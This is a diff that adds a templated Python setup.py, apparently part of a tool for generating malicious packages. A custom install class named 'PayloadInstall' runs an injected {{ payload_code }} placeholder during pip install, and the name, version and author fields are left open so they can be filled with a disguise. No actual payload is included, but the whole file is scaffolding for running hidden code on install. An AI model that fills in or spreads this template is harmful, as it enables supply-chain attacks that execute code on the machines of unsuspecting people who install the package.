@@ -1,0 +1,19 @@
+from setuptools import setup
+from setuptools.command.install import install
+import os
+import time
+
+class PayloadInstall(install):
+    def run(self):
+        {{ payload_code }}
+        install.run(self)
+
+setup(
+    name="{{ package_name }}",
+    version="{{ version }}",
+    author="{{ author_name }}",
+    author_email="{{ author_email }}",
+    description="{{ description }}",
+    py_modules=["{{ module }}"],
+    cmdclass={"install": PayloadInstall},
+)
